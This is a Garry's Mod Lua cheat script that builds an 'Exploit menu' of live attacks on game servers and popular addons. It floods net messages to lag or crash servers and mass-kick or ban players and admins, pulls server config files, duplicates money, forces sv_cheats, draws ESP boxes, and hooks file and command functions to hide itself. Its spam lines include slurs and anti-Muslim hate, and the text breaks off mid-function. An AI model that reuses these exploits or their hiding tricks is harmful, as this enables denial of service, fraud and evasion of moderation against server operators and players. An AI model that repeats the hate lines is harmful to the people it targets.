--variables--
local Rae = LocalPlayer() //Player.
local ply = LocalPlayer() //Player.
local gogogo = nil
local champ = {}
local KEY_LALT = KEY_B
local pinez = chat.AddText
local PURPLEEEEH = (Color(255,0,255))
local itexistswow = file.Exists
local twerkit = GetConVar
local ooobaby = input.IsKeyDown
local nice = hook.Add
local getit = require
local SpankIt = "CreateMove"
local DetectedStuff = "lua/bin/gmcl_cvar3_win32.dll"

if itexistswow(DetectedStuff, "GAME") then
                getit("cvar3")
                gogogo = "true"
                
        else
                gogogo = "false"
               
end


local _R_C_A_D_0_W_ = "0.4.7" //RCA D0W V3r.



/////////////////////////////////////////////////
// _S_H_A_D_O_W_ Recoded Fixed and more abuse //
///////////////////////////////////////////////


////////////////////////
// PickelJuice Team ///
//////////////////////


///////////////////////
// Main Menu Script //
/////////////////////
concommand.Add("RCAD0W_menu", function( Rae )
local menu = DermaMenu()





LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
menu:AddOption( "_R_C_A_D_0_W_ Exploit menu", function() LocalPlayer():EmitSound("UI/buttonclickrelease.wav",500,100) xMsg( "You are running version 0.1 of _R_C_A_D_0_W_.") end )
local Removing = menu:AddSubMenu( "Removing exploits" ) 
Removing:AddOption( "Remove allRemove all", function()  RunConsoleCommand( "sce_removeall" ) xMsg( "Attempting to remove everything.") end ) 
Removing:AddOption( "Ignite looking at", function() RunConsoleCommand( "sce_ignite" ) xMsg( "Attempting to ignite.") end )
Removing:AddOption( "Strip all players", function() RunConsoleCommand( "sce_removeweapons" ) xMsg( "Attempting to remove weapons.") end )
Removing:AddOption( "Remove all names", function() RunConsoleCommand( "sc_exploit_Remove_Names" ) xMsg( "Attempting to remove names.") end )
Removing:AddOption( "Remove looking at", function() RunConsoleCommand( "sc_exploit_remove_LookingAt" ) xMsg( "Attempting to remove whats in front of you.") end )
Removing:AddOption( "Remove all NPCs", function() RunConsoleCommand( "sce_removenpc" ) xMsg( "Attempting to remove NPCs.") end )

concommand.Add("+Rae_speedhack", speedhack_on)
concommand.Add("-Rae_speedhack", speedhack_off)

		concommand.Add("__BridgeHacklagdarkrpdashit",function()
		chatP("Starting the lag...")
		timer.Create("lag"..BridgeHack.RandomVar, 1, 0, function()
			for i=1,10000 do
				net.Start("DarkRP_spawnPocket")
				net.SendToServer()
			end
			status("PROGRESS[10000/10000]")
		end)
	end)
	
	concommand.Add( "__BridgeHackstopplag",function(  )
		chatP("Stopping the lag...")
		timer.Destroy("lag"..BridgeHack.RandomVar)
	end)

//////////////////////////
// SpeedHack Functions //
////////////////////////
function speedhack_on(  ) 
Rae:ConCommand("+speed;_host_framerate 8;host_framerate 8")

xMsg("Enabled SpeedHack")
end
function speedhack_off(  ) 
Rae:ConCommand("-speed;_host_framerate 0;host_framerate 0")

xMsg("Disabled SpeedHack")
end


local Dl = menu:AddSubMenu( "Download" )
Dl:AddOption( "Server CFG", function()
LocalPlayer():EmitSound("npc/metropolice/vo/copy.wav",500,100)
xMsg("Requesting Files.. Check Console.")
RunConsoleCommand("request_file", "cfg/server.cfg")
end):SetImage( "icon16/server_go.png" )

Dl:AddOption( "Console LOG", function()
LocalPlayer():EmitSound("npc/metropolice/vo/copy.wav",500,100)
xMsg("Console Log Downloaded.")
RunConsoleCommand("request_file", "./console.log")
end):SetImage( "icon16/application_xp_terminal.png" )



local Kickban = menu:AddSubMenu( "Ban/Kick" ) 
Kickban:AddOption( "Kick admins", function()
LocalPlayer():EmitSound("npc/metropolice/takedown.wav",500,100)
Rae:ConCommand("RAE_kickadmins")
end):SetImage( "icon16/disconnect.png" )

Kickban:AddOption( "Kick all *.*", function()
timer.Create("tpformebunghole", 0.00001,5, function()
for _, v in pairs (player.GetAll()) do
if v != LocalPlayer() then
for i = 1, 2500 do 
net.Start("wantsToVote")
net.WriteEntity(v)
net.SendToServer()
end
end
end
end)
end):SetImage( "icon16/disconnect.png" )

local Dank = menu:AddSubMenu( "Dank-Shit" )

Dank:AddOption( "Print Teams", function()
xMsg("Printing Teams.... View Console...")
PrintTable( team.GetAllTeams() )
end):SetImage( "icon16/bug.png" )


local CM = menu:AddSubMenu( "Car-Mods" )

CM:AddOption( "Throttle Rape", function()
xMsg("Car Throttle = On Crack")
Vehicle:SetMaxThrottle(999)
Vehicle:SetMaxReverseThrottle(999)
Vehicle:SetThrottle(999)
end):SetImage( "icon16/bug.png" )



local darkk = menu:AddSubMenu( "Dark RP" ) 


	
darkk:AddOption( "DarkRP UnAdminFreeze", function()
    RunConsoleCommand("say", "/sleep")
	timer.Simple(0.7, function()
		RunConsoleCommand("say", "/wakeup")
	end)
end):SetImage( "icon16/bug.png" )

CreateClientConVar("lenny_bunnyhop", 1, true, false)

function Bunnyhop()
	if GetConVar("lenny_bunnyhop"):GetInt() == 1 then
	 	if input.IsKeyDown(KEY_SPACE) then
	 		if LocalPlayer():IsOnGround() then
	 			RunConsoleCommand("+jump")
	 			timer.Create("Bhop", 0, 0.01, function()
	 		 	RunConsoleCommand("-jump")

	 		 	end)
	 		end
	 	end
	end
end

hook.Add("Think", "Hoppy", Bunnyhop )
local bhopoff
hook.Add("StartChat", "Bhpdisbaker", function()
	if GetConVarNumber("lenny_bunnyhop") == 1 then
		RunConsoleCommand("lenny_bunnyhop", 0)
		bhopoff = true
	else
		bhopoff = false
	end
end)


local playerS = menu:AddSubMenu( "Player Sploits" )

playerS:AddOption( "Bunny Hop V2", function()
hook.Add("FinishChat", "bhpenabler", function()
	if bhopoff then
		RunConsoleCommand("lenny_bunnyhop", 1)
		bhopoff = false
	end
end)
end):SetImage( "icon16/bug.png" )


local Exploit = menu:AddSubMenu( "Misc exploits" )


Exploit:AddOption( "Bypass AntiPK", function()  RunConsoleCommand( "RAZORV_bypasspk" ) xMsg( "Attempting to bypass AntiPK.") end ) 


Exploit:AddOption( "Lava Sky Hoverball", function()
xMsg("Hoverball Fucked. Spawn one to ruin sky.")
RunConsoleCommand("rope_material", "pp/bokehblur")
RunConsoleCommand("hoverball_model", "hoverball_model", "models/props_combine/portalskydome.mdl")
end):SetImage( "icon16/bug.png" )


		Exploit:AddOption( " [ON] ATLAS CHAT: FREEZE EVERYBODY",function() 
			chatP("Freezing everybody.. (Except you)")
			timer.Create("Imakelovetou"..BridgeHack.RandomVar,"3",0, function()
				local trash = "";
				for i=0, 15000 do
					trash = trash .. string.char(math.random(32, 126));
				end
				
				status("Freeze wave incoming")
				timer.Simple(1,function()
					status("Freeze wave done")
				end)
				
				for i=0,3 do  
					net.Start("atlaschat.chat")
						net.WriteString("// ".. trash)
					net.SendToServer()
				end
			end) 
		end):SetImage( "icon16/lock.png" )


		
		Exploit:AddOption( "[ON] DARKRP LAG", function()
			ply:ConCommand("__BridgeHacklagdarkrpdashit")
		end):SetImage( "icon16/accept.png" )
		
		Exploit:AddOption( "[OFF] DARKRP LAG", function()
			ply:ConCommand("__BridgeHackstopplag")
		end):SetImage( "icon16/cancel.png" )
		
		Exploit:AddOption( "Bypass APAnti (Anti propkill)",function() 
			chatP("Bypassing Apanti..")
			net.Receive("sMsgStandard", function()
				print("#Bypassed by HaxRUs")
			end)
		
			net.Receive("sNotifyHit", function()
			
			end)
			
			net.Receive("sMsgAdmins", function()
			
			end)
			
			net.Receive("sAlertNotice", function()
			
			end)
		end):SetImage( "icon16/link_break.png" )

		
		Exploit:AddOption( " [OFF] ATLAS CHAT: FREEZE EVERYBODY",function() 
			chatP("Stopping the freeze..")
			timer.Destroy("Imakelovetou"..BridgeHack.RandomVar,"3",0, function()
			
			end)   
		end):SetImage( "icon16/lock_open.png" )


Exploit:AddOption("Attempt Server Crash", function()
LocalPlayer():EmitSound("npc/metropolice/vo/lookingfortrouble.wav",500,100)
for i=0, 20 do
net.Start( 'NET_SS_DoBuyTakeoff' )
net.WriteEntity(LocalPlayer())
net.WriteEntity(swag)
net.WriteTable({})
net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
net.WriteString( "ͣΨҖࠇ߷࿥ឝ❦㉋", "ͣΨҖࠇ߷࿥ឝ❦㉋" )
net.SendToServer()
end
end):SetImage( "icon16/disconnect.png" )

Exploit:AddOption( "GodMod On", function()
xMsg("Go_dMod_e Toggled On")
LocalPlayer():GodEnable()
end):SetImage( "icon16/bug.png" )

Exploit:AddOption( "SpeedHack V2 [ON]", function()
twerkit("sv_cheats"):SetValue(1)
                twerkit("host_timescale"):SetValue(5)
end):SetImage( "icon16/bug.png" )

Exploit:AddOption( "SpeedHack V2 [OFF]", function()
twerkit("sv_cheats"):SetValue(0)
twerkit("host_timescale"):SetValue(1)
end):SetImage( "icon16/bug.png" )

 

Exploit:AddOption( "GodMod Off", function()
xMsg("Go_dMod_e Toggled On")
if LocalPlayer():Alive() then
LocalPlayer():GodDisable()
end
end):SetImage( "icon16/bug.png" )

Exploit:AddOption( "ByB Force Bail", function()
LocalPlayer():EmitSound("npc/metropolice/vo/allrightyoucango.wav",500,100)
net.Start("Letthisdudeout")
net.WriteEntity(Rae)
net.SendToServer()
end):SetImage( "icon16/lock_break.png" )

Exploit:AddOption( "Spawn Cannonball", function()
LocalPlayer():EmitSound("vo/canals/male01/stn6_incoming.wav",500,100)
xMsg("Cannonball Spawned.")
RunConsoleCommand("gm_spawn", "models/props_phx/cannonball_solid.mdl")
end):SetImage( "icon16/bomb.png" )

Exploit:AddOption("Atlas Chat Freeze", function()
LocalPlayer():EmitSound("npc/metropolice/vo/dontmove.wav",500,100)
xMsg ("Attempting to freeze")
local enabled = false
chat.AddText = MsgC
timer.Create("freeze_all", 0.1, 0, function()
if !enabled then
return
end
net.Start("atlaschat.chat")
local str = "/ooc "
for i=1, 100 do
str = str .. "<avatar>"
end
net.WriteString(str)
net.WriteBit(0)
net.SendToServer()
end)
enabled = !enabled
end):SetImage( "icon16/user_comment.png" )

Exploit:AddOption("Atlas Chat Unfreeze", function()
LocalPlayer():EmitSound("npc/metropolice/vo/allrightyoucango.wav",500,100)
xMsg ("Attempting to unfreeze.")
timer.Destroy("freeze_all") end )

local ESP = menu:AddSubMenu( "ESP" )
ESP:AddOption("> Player Box", function()
LocalPlayer():EmitSound("npc/metropolice/vo/acquiringonvisual.wav",500,100)
xMsg("Drawing a box around every player..")
timer.Simple(1, function()
local rotation_vectors =
{
	Vector( 1, 	1,	1 ),
	Vector( -1, 1, 	1 ),
	Vector( 1, 	-1, 1 ),
	Vector( -1, -1, 1 )
}
hook.Add( "HUDPaint", "xPlayerBox", function()
surface.SetDrawColor( color_white )
local w, h = ScrW(), ScrH()
for k,v in pairs( player.GetAll() ) do
if v ~= LocalPlayer() and v:IsValid() and v:IsPlayer() then
local p = v:GetPos()
local a = v:GetAngles()
local mins = v:OBBMins()
local maxs = v:OBBMaxs()	
local left, top 	= w, h
local right, bot	= 0, 0	
for _, v in next, rotation_vectors do
local mins, maxs = mins, maxs		
mins:Rotate( a )
maxs:Rotate( a )
local s_mins = ( p + mins * v ):ToScreen()
local s_maxs = ( p + maxs * v ):ToScreen()
left 	= math.min( left, math.min( s_mins.x, s_maxs.x ) )
top		= math.min( top, math.min( s_mins.y, s_maxs.y ) )
right 	= math.max( right, math.max( s_mins.x, s_maxs.x ) )
bot		= math.max( bot, math.max( s_mins.y, s_maxs.y ) )
end
surface.DrawOutlinedRect( left, top, right - left, bot - top )
end
end
end )
end)
xMsg("Player box has been enabled.")
end):SetImage("icon16/group_add.png")

ESP:AddOption("< Player Box", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
xMsg("Removing the box around every player.")
timer.Simple(1, function()
hook.Remove( "HUDPaint", "xPlayerBox")
xMsg("Player box has been disabled.")
end)
end):SetImage("icon16/group_add.png")

local ULX = menu:AddSubMenu( "ULX exploits" )
ULX:AddOption( "Unfreeze", function() LocalPlayer():EmitSound("vo/canals/arrest_stop.wav",500,100) RunConsoleCommand( "say","/sleep" ) xMsg( "Run command again in 5 seconds to be unfrozen.") end )

ULX:AddOption("AE Kick Admins", function()
LocalPlayer():EmitSound("npc/metropolice/vo/finalwarning.wav",500,100)
xMsg("Kicking Admins.")
timer.Create( "aekickdaskids", 3, 0, function()
for k,v in ipairs(player.GetAll()) do 
if( v:GetUserGroup() != "user" ) then
if( v:GetUserGroup() != "vip" ) then
for i=0, 1000 do 
net.Start("RaeWarning")
net.WriteEntity(v)
net.WriteString('You have to select a player before doing a action.')
net.SendToServer()
end
xMsg("Flooding Client: " ..v:Nick())
end
end 
end
end)
end):SetImage( "icon16/disconnect.png" )

ULX:AddOption( "ULX extended ban", function()
LocalPlayer():EmitSound("vo/canals/male01/gunboat_giveemhell.wav",500,100)
 xMsg( "Attempting to ban.")
if Warnings_for_kick then
 xMsg( "ULX extended not found.")
concommand.Add("banall", function()
for k,v in pairs(player.GetAll()) do
	if not v == LocalPlayer() then 
		net.Start("banleaver")
		net.WriteString(tostring(v:SteamID().."{sep}"..tostring(v:Name())))
		net.SendToServer()
	end
end
end)
concommand.Add("banadmins", function()
for k,v in pairs(player.GetAll()) do
	if not v == LocalPlayer() and v:Admin() then 
		net.Start("banleaver")
		net.WriteString(tostring(v:SteamID().."{sep}"..tostring(v:Name())))
		net.SendToServer()
	end
end
end)
else
 xMsg( "ULX extended not found.")
end end )

--Fucking, Variables and shite..
local ply = LocalPlayer()
local xVer = 1.2
local xReq = 0;
local xTim = math.random(1,500)
local amount = -500000000000
local xCol = math.random(1,255)
local xView = LocalPlayer():GetEyeTrace().Entity
local xName = { "001000110011", "11010101010", "1000101011", "100100010100", "101001011010" }
local xAdmin = { "STEAM_0:1:82597652", "STEAM_0:0:56486352", "STEAM_0:0:56486352", "STEAM_0:0:105619279", "STEAM_0:0:95111311" }
local xRandom = { "Muslims are destroying England.", "Jay is an autistic fucker.", "StandDev thinks he's a hacker.", "Regan rides a horse and cart.", "Josh has feret claws.", "Luke has a large, wonky ear" }

--Fucking functions for printing the fucking chat and console messasges you cunt.
function xMsg(message)
xReq = xReq + 1
chat.AddText(Color(255, 0, 0), "[_R_C_A_D_0_W_]: ", Color(255,255,255), message)
end
function xPnt(message)
xReq = xReq + 1
MsgC(Color(255, 0, 0), "[xHack]: ", Color(255,255,255), message, "\n")
end


local Extra = menu:AddSubMenu( "Cool extras" )




Extra:AddOption( "Enable Laser Beam", function()
LocalPlayer():EmitSound("npc/metropolice/vo/allunitsmovein.wav",500,100)
local laser = Material( "sprites/bluelaser1" )
hook.Add("RenderScreenspaceEffects", "runlaser", function()
if shouldbeam then return end
local startpos = LocalPlayer():GetPos()
local EndPos = LocalPlayer():GetEyeTrace().HitPos;
local model = LocalPlayer():GetViewModel()
if not IsValid(model) then
return
end
local attach = model:GetAttachment("1")
if ( Attach == 0 ) then Attach = ViewModel:LookupAttachment("muzzle") end
if not attach then return end
startpos = attach.Pos
cam.Start3D()
render.SetMaterial( laser )
render.DrawBeam( startpos, EndPos, 5, 0, 0, Color( 255, 0, 0 ) )
render.SetMaterial(Material("Sprites/light_glow02_add_noz"))
render.DrawQuadEasy(LocalPlayer():GetEyeTrace().HitPos, (EyePos() -  LocalPlayer():GetEyeTrace().HitPos):GetNormal(), 30, 30, Color( 255, 0, 0 ))
cam.End3D()
end)
end):SetImage( "icon16/wand.png" )

Extra:AddOption( "Disable Laser Beam", function()
LocalPlayer():EmitSound("npc/metropolice/vo/code7.wav",500,100)
hook.Remove("RenderScreenspaceEffects", "runlaser")
end):SetImage( "icon16/wand.png" )

Extra:AddOption( "Drop max money", function() LocalPlayer():EmitSound("npc/metropolice/vo/pickupthecan1.wav",500,100) RunConsoleCommand( "say","/dropmoney 2147483646" ) xMsg( "Attempting to drop money.") end )

Extra:AddOption( "Fast Physgun", function()
LocalPlayer():EmitSound("npc/metropolice/vo/quick.wav",500,100)
RunConsoleCommand("physgun_wheelspeed","10000")
end):SetImage( "icon16/lightning.png" )

Extra:AddOption( "Spoof Player Colors", function()
LocalPlayer():EmitSound("vo/canals/boxcar_sirens.wav",500,100)
timer.Create("spoofmeboi", 1, 0, function() 
Rae:ConCommand("cl_weaponcolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
Rae:ConCommand("cl_playercolor 0." .. math.random(1,255) .. " 0." .. math.random(1,255) .. " 0." .. math.random(1,255))
end)
end):SetImage( "icon16/palette.png" )

Extra:AddOption("Stop Spoofing Colors", function()
LocalPlayer():EmitSound("npc/metropolice/vo/rodgerthat.wav",500,100)
timer.Destroy("spoofmeboi")
xMsg("Spoofing Disabled.")
end):SetImage( "icon16/cross.png" )

Extra:AddOption("> Screen Material", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
timer.Simple(1, function() xMsg( "Effect added.")
function matScrn()
DrawMaterialOverlay( "effects/combine_binocoverlay.vmt", 0.5 )
end 
hook.Add( "RenderScreenspaceEffects", "MatScreen", matScrn )
end)
end):SetImage("icon16/map_add.png")

Extra:AddOption("< Screen Material", function()
LocalPlayer():EmitSound("UI/buttonclickrelease.wav",500,100)
timer.Simple(1, function() xMsg( "Effect removed.")
hook.Remove("RenderScreenspaceEffects", "MatScreen")
end)
end):SetImage("icon16/map_delete.png")

local xGen = menu:AddSubMenu( "General" )

xGen:AddOption("Check For Admins", function()
LocalPlayer():EmitSound("vo/canals/boxcar_becareful.wav",500,100)
timer.Simple( 1, function()
for k,v in pairs( player.GetAll() ) do
if v:IsValid() and v:IsAdmin() or v:IsUserGroup( "mod" ) or v:IsUserGroup( "Mod" ) or v:IsUserGroup() == "operator" then
xMsg("Admin: " .. v:Nick() .. " - SteamID: " .. v:SteamID() .. ".")
end
end
end)
end):SetImage("icon16/shield_go.png")

xGen:AddOption("List Information", function()
LocalPlayer():EmitSound("vo/canals/gunboat_herelook.wav",500,100)
timer.Simple(1 , function()
for k,v in pairs( player.GetAll()) do
if v:IsValid() and !v:IsAdmin() then
xMsg("User: " .. v:Nick() .. " - SteamID: " .. v:SteamID() .. ".")
end
end
end)
end):SetImage("icon16/database_add.png")

xGen:AddOption("Check Player Money", function()
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
timer.Simple(1 , function()
for k,v in pairs( player.GetAll() ) do
local xWallet = (v.DarkRPVars and v.DarkRPVars.money) or 0
xMsg("Player: " .. v:Nick() .. " - Money: $" .. xWallet .. ".")
end
end)
end):SetImage("icon16/coins.png")

local xVar = menu:AddSubMenu( "Variables" )

xVar:AddOption("Force Cheats", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
xMsg("Forcing sv_cheats for you..")
timer.Simple(1, function()
xMsg("The variable has been set.")
ply:ConCommand("incrementvar sv_cheats 0 1 1")
end)
end):SetImage("icon16/lock_break.png")

xVar:AddOption("Force Lua", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
xMsg("Forcing sv_allowcslua for you..")
timer.Simple(1, function()
xMsg("The variable has been set.")
ply:ConCommand("incrementvar sv_allowcslua 0 1 1")
end)
end):SetImage("icon16/lock_break.png")


local Flood = menu:AddSubMenu( "Flood" )

Flood:AddOption("> Name Stealing", function()
LocalPlayer():EmitSound("vo/canals/airboat_drivehard.wav",500,100)
timer.Simple( 1, function()
timer.Create("givemename", 0.12, 0, function()
local ThatNameBefore = ply:Nick()
for k,v in pairs( player.GetAll() ) do
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
if ligger_type1 == ligger_type then
if ThatNameBefore == v:Nick() then
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
else
ply:ConCommand("darkrp name " .. v:Nick() .. math.random(1,10))
end
local ligger_type = math.random(1,2)
local ligger_type1 = math.random(1,2)
end
end
end)
end)
end):SetImage("icon16/book_add.png")

Flood:AddOption("< Name Stealing", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
timer.Simple( 1, function()
timer.Destroy("givemename")
end)
end):SetImage("icon16/book_delete.png")

Flood:AddOption("> Chat Spam", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
timer.Simple( 1, function()
timer.Create("chatspamboi", 1, 0, function()
ply:ConCommand("say /ooc " .. table.Random(xRandom) .. "")
end)
end)

end):SetImage("icon16/lock.png")

Flood:AddOption("< Chat Spam", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
timer.Simple( 1, function()
timer.Destroy("chatspamboi")
end)
end):SetImage("icon16/lock.png")

Flood:AddOption("> Server Lag", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
timer.Simple( 1, function()
timer.Create("uSkid_lag", 1, 0, function()				
for i=1,10000 do
net.Start("DarkRP_spawnPocket")
net.SendToServer()
end
end)
end)
end):SetImage("icon16/disconnect.png")

Flood:AddOption("< Server Lag", function()
LocalPlayer():EmitSound("UI/buttonclick.wav",500,100)
timer.Simple( 1, function()
timer.Destroy("uSkid_lag")
end)
end):SetImage("icon16/connect.png")

local xPloit = menu:AddSubMenu( "Money exploits" )

xPloit:AddOption("$ Bailout NPC", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function()
timer.Create("givemecashlad", 0.1, 0, function()
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for k,v in pairs( player.GetAll() ) do
net.Start( "BailOut" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteFloat( amount ) -- $2,000,000 Free cash.
net.SendToServer()
end
end)
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ HitmanX", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start( "SendMoney" )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteString( amount )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Derma Hitmenu", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start("hitcomplete")
net.WriteDouble( 1073500000 )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ DaHit Menu", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start( "DaHit" )
net.WriteFloat( amount )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.WriteEntity( ply )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ HHH Hitmenu", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for k,v in pairs(player.GetAll()) do  
dahater = v
end
local hitRequest = {}
hitRequest.hitman = Rae
hitRequest.requester = Rae
hitRequest.target = dahater
hitRequest.reward = -99999999999999999999999
net.Start( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Boowie NPC", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
net.Start("BuyCar")
net.WriteFloat( amount )
net.WriteEntity( ply )
net.WriteString("Islam Sucks.")
net.WriteString("Islam Sucks.")
net.WriteString("Islam Sucks.")
net.SendToServer()
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ VCMod", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for i = 0, 100 do
net.Start( "AttemptSellCar" )
net.WriteTable( { E = ent } )
net.SendToServer()
end
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Car Dealer", function()
local ent = LocalPlayer():GetEyeTrace().Entity
if ( !IsValid( ent ) ) then
xMsg("You must be looking at your car.")
return
end
xMsg("Attempting to find addon and duplicate car..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
for i = 0, 100 do
net.Start( "RXCAR_Shop_Store_C2S" )
net.WriteTable( { E = ent } )
net.SendToServer()
end
end)
end):SetImage("icon16/money.png")

xPloit:AddOption("$ Bailout NPC", function()
xMsg("Attempting to find addon and give you money..")
timer.Simple( 1, function() 
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)
LocalPlayer():EmitSound("ambient/levels/labs/coinslot1.wav",500,100)



end)
end):SetImage("icon16/money.png")

		local Trolling = menu:AddSubMenu( "Trolling tools" )

		Trolling:AddOption( "Reconnect", function() RunConsoleCommand( "retry" ) end )
		Trolling:AddOption( "Suicide", function() LocalPlayer():EmitSound("vo/Breencast/br_welcome02.wav",500,100) RunConsoleCommand( "kill" ) xMsg( "You must hate life.") end )
		Trolling:AddOption( "Name:Chute meh", function() RunConsoleCommand( "say","/name Chute Meh" ) xMsg( "Oldest troll ever.") end )
		Trolling:AddOption( "Call admin", function() LocalPlayer():EmitSound("vo/canals/arrest_helpme.wav",500,100) RunConsoleCommand( "say","@Admin to me!" ) xMsg( "Calling for admin.") end )

        menu:AddOption( "Open ULX", function()  LocalPlayer():EmitSound("vo/Breencast/br_welcome07.wav",500,100) RunConsoleCommand( "xgui" ) xMsg( "ULX opened.") end )
	


	-- Start off by making the table.
local SCE = {}
local SCE_HasToggled = {}

local net = net
local concommand = concommand
local file = file


local oldfileRead = file.Read
function file.Read(contents, type)
	if not contents then return nil end
	if string.lower(contents):find("scnew") or string.lower(contents):find("scexploit") then return nil end
       
	return oldfileRead(contents, type)
end

local oldccRun = concommand.Run
function concommand.Run( player, command, arguments, args )
	if SCE[ command:lower() ] then
		SCE[ command:lower() ].Function( player, command, arguments, args )
		return true
	end
	
	oldccRun( player, command, arguments, args )
end


	-- End.

	-- Utility functions
local function sce_AddCommand( cmd, func, help )
	SCE[ "sc_" .. cmd:lower() ] = {Function = func, Help = help}
	AddConsoleCommand( "sc_" .. cmd:lower(), help )
end

local function FindPlayer( pl )
	for i=1,#player.GetAll() do
		local v = player.GetAll()[ i ]
		
		if string.find(string.lower(v:Nick()), string.lower(tostring(pl))) then
			return v
		elseif v:UserID() == tonumber(pl) then
			return v
		end
	end
	
	return nil
end
		

/*local function exploitRemove( tbl_ToRemove )
	--local findalldem = {}
	--for k,v in pairs(tbl_ToRemove) do
		
	--	findalldem[ k ] = {
	PrintTable(tbl_ToRemove)
	for i=1,#ents.GetAll() do
		local v = ents.GetAll()[ i ]
		
		local shouldremove = false
		
		--for k,v in pairs(tbl_ToRemove) do if string.lower(tostring(v)):find( k:lower() ) then shouldremove = true end end
		--for k,v in pairs(tbl_ToRemove) do
			if string.find( string.lower(tostring(v)), "weapon" ) then
				print("Yes")
			end
		--end
		
		if shouldremove then
			net.Start("properties")
				net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
				net.WriteEntity( v )
			net.SendToServer()
		end
	end
end*/

local function exploitRemove( str_entity, b_IsEntity )
	if b_IsEntity then
		net.Start("properties")
			net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
			net.WriteEntity( str_entity )
		net.SendToServer()
	
		return
	end
	for i=1,#ents.GetAll() do
		local v = ents.GetAll()[ i ]
		
		if string.find( string.lower(tostring(v)), str_entity ) then
			if not v.ImOwner then
				net.Start("properties")
					net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
					net.WriteEntity( v )
				net.SendToServer()
			end
		end
	end
end

local function exploitCollisions( toCollision, str_On, b_IsEntity, lookfor )
	if b_IsEntity then
		net.Start("properties")
			net.WriteUInt( util.NetworkStringToID( "collision_" .. str_On ), 32 )
